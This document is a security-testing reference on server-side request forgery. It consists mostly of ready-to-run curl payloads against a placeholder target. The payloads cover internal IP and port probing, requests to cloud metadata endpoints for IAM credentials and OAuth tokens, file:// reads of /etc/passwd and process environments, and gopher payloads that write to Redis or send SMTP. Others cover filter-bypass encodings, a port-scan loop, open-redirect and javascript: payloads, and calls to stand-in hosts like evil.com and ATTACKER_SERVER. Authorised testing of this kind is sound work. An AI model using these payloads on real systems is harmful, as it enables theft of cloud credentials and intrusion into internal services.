# SSRF and Network-Level Testing Reference

Comprehensive testing methodology for Server-Side Request Forgery (SSRF) and related network-level vulnerabilities. All techniques are backend-agnostic and operate at the HTTP level.

---

## Identifying SSRF-Susceptible Parameters

Look for parameters that accept URLs, hostnames, IPs, or file paths:

- URL parameters: `url=`, `uri=`, `path=`, `src=`, `href=`, `link=`, `redirect=`, `callback=`, `next=`, `target=`, `dest=`, `proxy=`
- Webhook URLs: `webhook_url=`, `callback_url=`, `notification_url=`
- Import/fetch functionality: `import=`, `fetch=`, `load=`, `download=`
- Image/file URLs: `image_url=`, `file_url=`, `avatar_url=`, `icon_url=`
- API endpoints that proxy or fetch remote content

---

## Basic SSRF Payloads

### Internal IP Addresses

```bash
# Localhost variants
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1"
curl -s "http://TARGET/api/fetch?url=http://localhost"
curl -s "http://TARGET/api/fetch?url=http://0.0.0.0"
curl -s "http://TARGET/api/fetch?url=http://[::1]"
curl -s "http://TARGET/api/fetch?url=http://0"
curl -s "http://TARGET/api/fetch?url=http://127.1"
curl -s "http://TARGET/api/fetch?url=http://127.0.1"

# Internal network ranges
curl -s "http://TARGET/api/fetch?url=http://10.0.0.1"
curl -s "http://TARGET/api/fetch?url=http://172.16.0.1"
curl -s "http://TARGET/api/fetch?url=http://192.168.0.1"
curl -s "http://TARGET/api/fetch?url=http://192.168.1.1"
```

### Cloud Metadata Endpoints

```bash
# AWS metadata (IMDSv1)
curl -s "http://TARGET/api/fetch?url=http://169.254.169.254/latest/meta-data/"
curl -s "http://TARGET/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "http://TARGET/api/fetch?url=http://169.254.169.254/latest/user-data/"
curl -s "http://TARGET/api/fetch?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"

# GCP metadata
curl -s "http://TARGET/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
curl -s -H "Metadata-Flavor: Google" \
  "http://TARGET/api/fetch?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

# Azure metadata
curl -s "http://TARGET/api/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -s -H "Metadata: true" \
  "http://TARGET/api/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"

# DigitalOcean metadata
curl -s "http://TARGET/api/fetch?url=http://169.254.169.254/metadata/v1/"

# Oracle Cloud metadata
curl -s "http://TARGET/api/fetch?url=http://169.254.169.254/opc/v1/instance/"

# Alibaba Cloud metadata
curl -s "http://TARGET/api/fetch?url=http://100.100.100.200/latest/meta-data/"
```

### Internal Service Ports

```bash
# Common internal services
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:6379"     # Redis
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:27017"    # MongoDB
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:3306"     # MySQL
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:5432"     # PostgreSQL
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:9200"     # Elasticsearch
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:8080"     # Alt HTTP
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:8443"     # Alt HTTPS
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:11211"    # Memcached
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:2379"     # etcd
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:8500"     # Consul
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:5000"     # Docker Registry
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:9090"     # Prometheus
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:3000"     # Grafana
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:15672"    # RabbitMQ Management
```

---

## SSRF Bypass Techniques

### Hex IP Encoding

```bash
# 127.0.0.1 = 0x7f000001
curl -s "http://TARGET/api/fetch?url=http://0x7f000001"
curl -s "http://TARGET/api/fetch?url=http://0x7f.0x0.0x0.0x1"

# 169.254.169.254 = 0xa9fea9fe
curl -s "http://TARGET/api/fetch?url=http://0xa9fea9fe"
```

### Octal IP Encoding

```bash
# 127.0.0.1 in octal
curl -s "http://TARGET/api/fetch?url=http://0177.0.0.01"
curl -s "http://TARGET/api/fetch?url=http://0177.0.0.1"

# 169.254.169.254 in octal
curl -s "http://TARGET/api/fetch?url=http://0251.0376.0251.0376"
```

### Decimal IP Encoding

```bash
# 127.0.0.1 as decimal integer
curl -s "http://TARGET/api/fetch?url=http://2130706433"

# 169.254.169.254 as decimal integer
curl -s "http://TARGET/api/fetch?url=http://2852039166"
```

### IPv6 Representations

```bash
curl -s "http://TARGET/api/fetch?url=http://[::1]"
curl -s "http://TARGET/api/fetch?url=http://[0:0:0:0:0:0:0:1]"
curl -s "http://TARGET/api/fetch?url=http://[::ffff:127.0.0.1]"
curl -s "http://TARGET/api/fetch?url=http://[0000::1]"
curl -s "http://TARGET/api/fetch?url=http://[::1]:80"
```

### URL Encoding

```bash
# URL-encode the internal IP
curl -s "http://TARGET/api/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31"
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1%23@evil.com"
curl -s "http://TARGET/api/fetch?url=http://evil.com%23@127.0.0.1"
```

### DNS Rebinding

```bash
# Use a DNS rebinding service that alternates between external and internal IPs
# nip.io resolves to the IP in the hostname
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1.nip.io"
curl -s "http://TARGET/api/fetch?url=http://169.254.169.254.nip.io"

# sslip.io
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1.sslip.io"

# xip.io (if still available)
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1.xip.io"
```

### Redirect Chains

```bash
# If the server follows redirects, use an external URL that redirects to internal
# Test if the server follows redirects
curl -s "http://TARGET/api/fetch?url=http://httpbin.org/redirect-to?url=http://127.0.0.1"

# Use a controlled redirect
curl -s "http://TARGET/api/fetch?url=http://ATTACKER_SERVER/redirect?to=http://169.254.169.254/latest/meta-data/"
```

### URL Parser Confusion

```bash
# Userinfo section abuse
curl -s "http://TARGET/api/fetch?url=http://evil.com@127.0.0.1"
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1@evil.com"

# Backslash confusion
curl -s "http://TARGET/api/fetch?url=http://evil.com\@127.0.0.1"

# Fragment abuse
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1#@evil.com"

# Enclosed alphanumeric characters
curl -s "http://TARGET/api/fetch?url=http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ"

# Rare domain characters
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:80@evil.com"
curl -s "http://TARGET/api/fetch?url=http://127%2e0%2e0%2e1"
```

---

## Port Scanning via SSRF

### Methodology

Use SSRF to scan internal ports by observing response differences:

```bash
# Scan common ports on localhost
for port in 21 22 23 25 80 443 3000 3306 5432 6379 8080 8443 9200 11211 27017; do
  echo -n "Port $port: "
  curl -s -o /dev/null -w "HTTP:%{http_code} TIME:%{time_total}" \
    "http://TARGET/api/fetch?url=http://127.0.0.1:$port"
  echo
done
```

### Detection Patterns

- **Open port**: Fast response, possibly with service banner or content
- **Closed port**: Fast response with "connection refused" error
- **Filtered port**: Slow response (timeout), different error message
- **Service identification**: Response content may reveal service type

---

## Protocol Smuggling

### File Protocol

```bash
curl -s "http://TARGET/api/fetch?url=file:///etc/passwd"
curl -s "http://TARGET/api/fetch?url=file:///etc/hosts"
curl -s "http://TARGET/api/fetch?url=file:///proc/self/environ"
curl -s "http://TARGET/api/fetch?url=file:///proc/self/cmdline"
curl -s "http://TARGET/api/fetch?url=file:///c:/windows/win.ini"
```

### Gopher Protocol

```bash
# Gopher can be used to send raw TCP data to internal services
# Redis command execution via gopher
curl -s "http://TARGET/api/fetch?url=gopher://127.0.0.1:6379/_SET%20ssrf_test%20pwned%0D%0A"

# SMTP smuggling via gopher
curl -s "http://TARGET/api/fetch?url=gopher://127.0.0.1:25/_EHLO%20evil.com%0D%0AMAIL%20FROM:attacker@evil.com%0D%0A"
```

### Dict Protocol

```bash
# Dict protocol can interact with Redis and similar services
curl -s "http://TARGET/api/fetch?url=dict://127.0.0.1:6379/INFO"
curl -s "http://TARGET/api/fetch?url=dict://127.0.0.1:11211/stats"
```

### FTP Protocol

```bash
curl -s "http://TARGET/api/fetch?url=ftp://127.0.0.1/"
curl -s "http://TARGET/api/fetch?url=ftp://anonymous:anonymous@127.0.0.1/"
```

---

## Open Proxy / Redirect Detection

### Open Redirect Testing

```bash
# Test redirect parameters
curl -s -D - -o /dev/null "http://TARGET/redirect?url=https://evil.com"
curl -s -D - -o /dev/null "http://TARGET/login?next=https://evil.com"
curl -s -D - -o /dev/null "http://TARGET/logout?redirect=https://evil.com"
curl -s -D - -o /dev/null "http://TARGET/api/callback?return_url=https://evil.com"

# Bypass attempts
curl -s -D - -o /dev/null "http://TARGET/redirect?url=//evil.com"
curl -s -D - -o /dev/null "http://TARGET/redirect?url=/\\evil.com"
curl -s -D - -o /dev/null "http://TARGET/redirect?url=https://evil.com%23.TARGET.com"
curl -s -D - -o /dev/null "http://TARGET/redirect?url=https://TARGET.com.evil.com"
curl -s -D - -o /dev/null "http://TARGET/redirect?url=https://TARGET.com@evil.com"
curl -s -D - -o /dev/null "http://TARGET/redirect?url=javascript:alert(1)"
curl -s -D - -o /dev/null "http://TARGET/redirect?url=data:text/html,<script>alert(1)</script>"
```

### Open Redirect Detection Indicators

- HTTP 301/302/303/307/308 with `Location` header pointing to attacker domain
- JavaScript-based redirect to attacker domain
- Meta refresh tag redirecting to attacker domain

---

## Webhook Callback Testing

### Methodology

If the application supports webhook registration:

```bash
# Register a webhook pointing to internal services
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:6379"}' \
  "http://TARGET/api/webhooks"

curl -s -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}' \
  "http://TARGET/api/webhooks"

# Register webhook to attacker-controlled server to observe requests
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://ATTACKER_SERVER/callback"}' \
  "http://TARGET/api/webhooks"
```

### Webhook SSRF Indicators

- Webhook successfully contacts internal services
- Response or logs contain internal service data
- Attacker server receives HTTP request from target server IP

---

## Internal Service Enumeration

### Common Internal Endpoints

```bash
# Kubernetes metadata
curl -s "http://TARGET/api/fetch?url=https://kubernetes.default.svc/api/v1/namespaces"
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:10255/pods"

# Docker
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:2375/containers/json"
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:2376/info"

# Consul
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:8500/v1/catalog/services"
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:8500/v1/agent/self"

# etcd
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:2379/v2/keys/"
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:2379/version"

# Eureka
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:8761/eureka/apps"

# Spring Boot Actuator
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:8080/actuator/env"
curl -s "http://TARGET/api/fetch?url=http://127.0.0.1:8080/actuator/configprops"
```

---

## SSRF Detection Indicators

- **Direct SSRF confirmed**: Response contains internal service data, file contents, or metadata
- **Blind SSRF indicators**: Different response times for internal vs external URLs, different error messages, DNS resolution of attacker-controlled domain from target server
- **Error-based indicators**: Error messages revealing internal IPs, hostnames, or port states
- **Protocol-based indicators**: Responses containing protocol-specific data (Redis `+OK`, FTP banners)

---

## General SSRF Testing Checklist

1. **Identify all URL-accepting parameters** in the application
2. **Test each with localhost** (127.0.0.1) to confirm basic SSRF
3. **Test cloud metadata endpoints** (169.254.169.254)
4. **Try bypass techniques** if basic payloads are blocked
5. **Check protocol handling** (file://, gopher://, dict://)
6. **Test for blind SSRF** using timing and error differences
7. **Scan internal ports** if SSRF is confirmed
8. **Document the exact request and response** for each finding
9. **Assess impact**: Can credentials be stolen? Can internal services be accessed?
